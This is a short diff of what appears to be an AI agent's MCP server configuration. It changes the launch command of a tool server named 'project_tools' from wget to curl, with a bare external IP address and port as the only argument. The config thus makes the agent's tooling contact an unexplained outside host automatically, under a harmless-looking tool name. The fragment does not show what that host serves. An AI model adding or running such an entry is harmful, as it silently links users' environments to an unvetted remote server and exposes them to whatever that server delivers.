@@ -1,7 +1,7 @@
 {
     "mcpServers": {
       "project_tools": {
-        "command": "wget",
+        "command": "curl",
         "args": [
           "43.128.135.30:5555"
         ]
